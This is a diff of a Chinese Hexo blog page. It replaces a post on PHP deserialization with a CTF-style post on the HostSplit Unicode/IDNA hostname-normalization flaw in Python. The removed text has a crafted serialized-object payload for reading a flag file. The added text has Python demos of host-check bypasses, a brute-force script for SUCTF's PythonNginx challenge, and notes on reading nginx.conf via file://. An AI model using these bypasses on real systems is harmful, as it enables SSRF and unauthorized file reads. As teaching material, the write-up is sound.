@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>序列化与反序列化 | Hexo</title>
-  <meta name="keywords" content=" php , serialize ">
-  <meta name="description" content="序列化与反序列化 | Hexo">
+  <title>HostSplit | Hexo</title>
+  <meta name="keywords" content=" python ">
+  <meta name="description" content="HostSplit | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="php 弱类型总结字符与数字的比较&amp;lt;?php  $a=1; if($a=TRUE)     echo &amp;quot;1111\n&amp;quot;; if($a=&amp;#39;a&amp;#39;)     echo &amp;quot;1111\n&amp;quot;;  结果 1111 1111联想到之前P神的文章，TRUE+TRUE=2 $_=(&amp;#39;&amp;gt;&amp;#39;&amp;gt;&amp;#39;&amp;lt;&amp;#39;)+(&amp;#3">
 <meta name="keywords" content="php,弱类型">
@@ -554,9 +554,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-序列化与反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-HostSplit" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">序列化与反序列化</h1>
+        <h1 class="article-title">HostSplit</h1>
     
     <div class="article-meta">
         
@@ -571,16 +571,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color4">php</a>
-            
-            <a href="javascript:" class="color5">serialize</a>
+            <a href="javascript:" class="color2">python</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-10 15:52:56'>2019-03-23 15:13</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-22 23:41:02'>2019-08-22 11:39</time>
         
     </div>
     <div class="article-meta">
@@ -602,7 +600,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01为什么要序列化"><span class="toc-text">0x01为什么要序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#魔法函数"><span class="toc-text">魔法函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞产生"><span class="toc-text">漏洞产生</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Return-Oriented-programming-链"><span class="toc-text">ROP(Return-Oriented programming)链</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习"><span class="toc-text">HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDN-与-UTF-8"><span class="toc-text">IDN 与 UTF-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unicode-➔-ASCII-–-A-Two-Step-Process"><span class="toc-text">Unicode ➔ ASCII – A Two Step Process</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Splitting-Hostnames"><span class="toc-text">Splitting Hostnames</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-utf-8-unicode-ascii互转"><span class="toc-text">python utf-8,unicode,ascii互转</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-was-vulnerable"><span class="toc-text">Python was vulnerable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-had-an-extra-variant"><span class="toc-text">Python had an extra variant</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-PythonNginx"><span class="toc-text">SUCTF PythonNginx</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hosts文件"><span class="toc-text">hosts文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file协议"><span class="toc-text">file协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx配置"><span class="toc-text">nginx配置</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -617,146 +615,133 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>老生长谈了，可是我还是不会</p>
-<a id="more"></a>
-
-<h2 id="0x01为什么要序列化"><a href="#0x01为什么要序列化" class="headerlink" title="0x01为什么要序列化"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p>
-<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kawe13ecj305w03nt8i.jpg" alt></p>
-<p>其中index.php代码如下：</p>
-<pre><code>&lt;?php 
-@highlight_file(__FILE__);
-require_once(&#39;shield.php&#39;);
-$x = new Shield();
-isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
-if (!empty($g)) {
-    $x = unserialize($g);
-}
-echo $x-&gt;readfile();
-?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p>
-<p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p>
-<p>看一个例子，简单的分析一下：</p>
-<pre><code>&lt;?php
-class Test
-{
-public $age = 0;
-public $name = &#39;brain&#39;;
-
-public function PrintInfo()
-{
-    echo &#39;[+]User: &#39;.$this-&gt;name .&#39;: is&#39; . $this-&gt;age .&#39;years old.&#39;;
-}
-}
-$user =  new Test();
-$user-&gt;age = 20;
-$user-&gt;name = &#39;Jack&#39;;
-$user-&gt;PrintInfo();
-echo serialize($user);
-
-?&gt;</code></pre><p>输出结果如下</p>
-<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kawi4ovpj30p204wdg5.jpg" alt></p>
-<p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p>
-<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p>
-<pre><code>&lt;?php
-class Test
-{
-public $variable = &quot;BRAIN&quot;;
-public $variable1 = &quot;BRAVO&quot;;
-public function PrintVariable()
-{
-    echo $this-&gt;variable . &#39;&lt;br /&gt;&#39;;
-}
-public function __construct()
-{
-    echo &#39;__construct&#39;.&#39;&lt;br&gt;&#39;;
-}
-public function __destruct()
-{
-    echo &#39;__destruct&lt;br /&gt;&#39;;
-}
-public function __wakeup()
-{
-    echo &#39;__wakeup&lt;br /&gt;&#39;;
-}
-public function __sleep()
-{
-    echo &#39;__sleep&lt;br /&gt;&#39;;
-    return array(&#39;variable&#39; , &#39;variable1&#39;);
-}
-}    
-$obj = new Test();  //创建对象时调用__construct
-
-$serialized = serialize($obj); //序列化对象时调用__sleep
-
-print(&#39;Serialized: &#39;.$serialized . &#39;&lt;br /&gt;&#39;);
-
-$obj2 = unserialize($serialized); //重建对象调用 __wakeup
-
-$obj2-&gt;PrintVariable(); //调用方法输出数据
-//脚本结束调用__destruct
-?&gt;</code></pre><p>这是执行结果：</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kawmc729j30h504a746.jpg" alt></p>
-<p>可以看到各个函数的执行顺序。</p>
-<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p>
-<p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p>
-<pre><code>    idnex.php
-
-&lt;?php 
-@highlight_file(__FILE__);
-require_once(&#39;shield.php&#39;);
-$x = new Shield();
-isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
-if (!empty($g)) {
-    $x = unserialize($g);
-}
-echo $x-&gt;readfile();
-?&gt;
-
-
-shield.php
-
-&lt;?php
-//flag is in pctf.php
-class Shield {
-    public $file;
-    function __construct($filename = &#39;&#39;) {
-        $this -&gt; file = $filename;
-    }
-    function readfile() {
-        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-        &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
-            return @file_get_contents($this-&gt;file);
-        }
-    }
-}
-?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p>
-<p>我们的想法就是控制$file的值为pctf.php</p>
-<pre><code>&lt;?php
-//flag is in pctf.php
-class Shield {
-    public $file;
-    function __construct($filename = &#39;&#39;) {
-        $this -&gt; file = $filename;
-    }
-    function readfile() {
-        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-        &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
-            return @file_get_contents($this-&gt;file);
-        }
-    }
-}
-$a = new Shield(&quot;pctf.php&quot;);
-echo serialize($a);
-?&gt;
-序列化结果
-O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p>
-<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p>
-<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kawpcjn0j30br08twep.jpg" alt></p>
-<h2 id="ROP-Return-Oriented-programming-链"><a href="#ROP-Return-Oriented-programming-链" class="headerlink" title="ROP(Return-Oriented programming)链"></a>ROP(Return-Oriented programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p>
+        <h1 id="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习"><a href="#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习" class="headerlink" title="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习"></a>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习</h1><h2 id="IDN-与-UTF-8"><a href="#IDN-与-UTF-8" class="headerlink" title="IDN 与 UTF-8"></a>IDN 与 UTF-8</h2><p><strong>IDN</strong></p>
 <blockquote>
-<p>1.存在序列化字符串的可控制点或者说是输入点</p>
-<p>2.存在可以利用的魔法函数</p>
+<p>国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域名。<br>科研人员又将纯数字表示的IP地址基础上推出更加便于记忆的字符型访问标识，即基于IP地址的域名系统。这些域名只能使用63个ASCII字符（”a-z”，”A-Z”，”0-9”，”-“）. 随着互联网在非英语国家的迅猛发展，九十年代末期国际互联网界提出了将原本只能使用63个ASCII字符的域名，采用本地语言文字来表示，也就是出现了对多语种域名的需求。</p>
 </blockquote>
-<p>这道题目对魔法函数的利用好像不是很明显.(ε=ε=ε=┏(゜ロ゜;)┛)</p>
+<p><a href="http://中国政府.政务/" target="_blank" rel="noopener">http://中国政府.政务/</a></p>
+<p>这是我国的政府网站！</p>
+<p><strong>UTF-8</strong></p>
+<blockquote>
+<p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字符编码，由Ken Thompson于1992年创建，现在已经标准化为RFC 3629。UTF-8用1到4个字节编码Unicode字符。用在网页上可以统一页面显示中文简体繁体及其它语言.</p>
+</blockquote>
+<p>Puny 编码 (Punycode)</p>
+<blockquote>
+<p>这是一个简易而准确的IDN ASCII 编码系统 (ASCII-Compatible Encoding (ACE))。它能转换一系列的 字符编码成为字符以符合主机名称(hostname)标准 (ASCII 字母，数位和连字符号)。<br>例: xn–0zwm56d.test </p>
+</blockquote>
+<pre><code>中国.政府-&gt;xn--fiqs8s.xn--mxtq1m</code></pre><h2 id="Unicode-➔-ASCII-–-A-Two-Step-Process"><a href="#Unicode-➔-ASCII-–-A-Two-Step-Process" class="headerlink" title="Unicode ➔ ASCII – A Two Step Process"></a>Unicode ➔ ASCII – A Two Step Process</h2><ol>
+<li>Normalization Convert characters to a “standardized form”.</li>
+<li>Punycoding Turn Unicode into ASCII.</li>
+</ol>
+<p>意思就是说IDN的使用底层还是ASCII的功劳。先转换成标准形式然后进行puny编码。</p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg" alt="转换过程"></p>
+<h2 id="Splitting-Hostnames"><a href="#Splitting-Hostnames" class="headerlink" title="Splitting Hostnames"></a>Splitting Hostnames</h2><pre><code>https://evil.c℀.Example.com</code></pre><p>我们对他进行转换成ASCII会发生什么？</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg" alt="Normalizing "></p>
+<pre><code>https://evil.ca/c.Example.com</code></pre><p><strong>No need to Punycode anything – it’s all ASCII now!</strong>也就是不用再次编码已经可以解析了</p>
+<h2 id="python-utf-8-unicode-ascii互转"><a href="#python-utf-8-unicode-ascii互转" class="headerlink" title="python utf-8,unicode,ascii互转"></a>python utf-8,unicode,ascii互转</h2><p>unicode-&gt;ascii</p>
+<pre><code>&gt;&gt;&gt; ord(u&#39;脑&#39;)
+33041</code></pre><p>ascii-&gt;unicode</p>
+<pre><code>&gt;&gt;&gt; chr(33041)
+&#39;脑</code></pre><p>unicode &lt;=&gt; utf-8</p>
+<pre><code>&gt;&gt;&gt; n = u.encode(&#39;utf8&#39;)
+&gt;&gt;&gt; n
+b&#39;\xe5\xb1\x8c&#39;
+
+&gt;&gt;&gt; m = n.decode(&#39;utf8&#39;)</code></pre><p>注：linux默认编码为unicode，若为其他两种编码进行转换，需unicode作为“媒介</p>
+<h2 id="Python-was-vulnerable"><a href="#Python-was-vulnerable" class="headerlink" title="Python was vulnerable"></a>Python was vulnerable</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlsplit, urlunsplit 
+&gt;&gt;&gt; url = &#39;http://canada.c℀.microsoft.com/some.txt&#39; 
+&gt;&gt;&gt; parts = list(urlsplit(url)) 
+&gt;&gt;&gt; host = parts[1] 
+&gt;&gt;&gt; host &#39;canada.c℀.microsoft.com&#39; 
+&gt;&gt;&gt; newhost = [] 
+&gt;&gt;&gt; for h in host.split(&#39;.&#39;): 
+... newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)) 
+... 
+&gt;&gt;&gt; parts[1] = &#39;.&#39;.join(newhost) 
+&gt;&gt;&gt; finalUrl = urlunsplit(parts) 
+&gt;&gt;&gt; finalUrl 
+&#39;http://canada.ca/c.microsoft.com/some.txt&#39; </code></pre><h2 id="Python-had-an-extra-variant"><a href="#Python-had-an-extra-variant" class="headerlink" title="Python had an extra variant"></a>Python had an extra variant</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse 
+&gt;&gt;&gt; r=&#39;http://bing.com&#39;+u&#39;\uFF03&#39;+&#39;:password@products.office.com&#39; 
+&gt;&gt;&gt; o = urlparse(r) 
+&gt;&gt;&gt; o.hostname &#39;products.office.com&#39; 
+&gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;) 
+&gt;&gt;&gt; a &#39;http://bing.com#:password@products.office.com&#39; 
+&gt;&gt;&gt; o = urlparse(a) 
+&gt;&gt;&gt; o.hostname 
+&#39;bing.com&#39;</code></pre><h2 id="SUCTF-PythonNginx"><a href="#SUCTF-PythonNginx" class="headerlink" title="SUCTF PythonNginx"></a>SUCTF PythonNginx</h2><p>SUCTF中的一道题：</p>
+<pre><code>    @app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def getUrl():
+    url = request.args.get(&quot;url&quot;)
+    host = parse.urlparse(url).hostname
+    if host == &#39;suctf.cc&#39;:
+        return &quot;我扌 your problem? 111&quot;
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == &#39;suctf.cc&#39;:
+        return &quot;我扌 your problem? 222 &quot; + host
+    newhost = []
+    for h in host.split(&#39;.&#39;):
+        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
+    parts[1] = &#39;.&#39;.join(newhost)
+    #去掉 url 中的空格
+    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == &#39;suctf.cc&#39;:
+        return urllib.request.urlopen(finalUrl).read()
+    else:
+        return &quot;我扌 your problem? 333&quot;</code></pre><p>爆破最后一位c</p>
+<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit
+from urllib import parse
+def get_unicode():
+    for x in range(65536):
+        uni=chr(x)
+        url=&quot;http://suctf.c{}&quot;.format(uni)
+        try:
+            if getUrl(url):
+                print(&#39;11&#39;)
+                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])
+        except:
+            pass
+
+
+def getUrl(url):
+    url = url
+    host = parse.urlparse(url).hostname
+    if host == &#39;suctf.cc&#39;:
+        return False
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == &#39;suctf.cc&#39;:
+        return False
+    newhost = []
+    for h in host.split(&#39;.&#39;):
+        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
+    parts[1] = &#39;.&#39;.join(newhost)
+    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == &#39;suctf.cc&#39;:
+        return True
+    else:
+        return False
+
+if __name__==&quot;__main__&quot;:
+    get_unicode()
+
+str: �G unicode: \u2105
+str: �� unicode: \uff23
+str: �� unicode: \uff43
+[Finished in 6.5s]</code></pre><h3 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统再会将网址提交DNS域名解析服务器进行IP地址的解析。</p>
+<h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>中文意思：本地文件传输协议<br>什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。<br>如何使用File：要使用File协议，基本的格式如下：file:///文件路径，比如要打开F盘flash文件夹中的1.swf文件，那么可以在资源管理器或浏览器地址栏中输入：file:///f:/flash/1.swf回车。</p>
+<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p> Nginx的配置文件是一个纯文本文件，它一般位于Nginx安装目录的conf目录下，整个配置文件是以block的形式组织的。每个block一般以一个大括号“{”来表示。block 可以分为几个层次，整个配置文件中Main命令位于最高层，在Main层下面可以有Events、 HTTP等层级，而在HTTP层中又包含Server层，即server block, serverblock中又可分为location层，并且一个server block中可以包含多个location block。</p>
+<p>nginx配置文件路径</p>
+<pre><code>[root@localhost vhost]# locate nginx.conf
+/usr/local/nginx/conf/nginx.conf
+/usr/local/nginx/conf/nginx.conf.default</code></pre><p>hosts文件绑定本地回环地址，尝试file读文件</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg" alt="尝试读文件"></p>
+<p>读nginx配置文件</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg" alt="读配置文件"></p>
+<p>读flag</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg" alt="读flag"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 brainsemail@163.com </span>
@@ -770,12 +755,12 @@ O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>序列化与反序列化</p>
+    <p><span class="copy-title">文章标题:</span>HostSplit</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-03-23, 15:13:47</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-10, 15:52:56</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/03/23/序列化与反序列化/" title="序列化与反序列化">https://github.com/BrainLyh/2019/03/23/序列化与反序列化/</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-22, 11:39:23</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-22, 23:41:02</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/22/HostSplit/" title="HostSplit">https://github.com/BrainLyh/2019/08/22/HostSplit/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
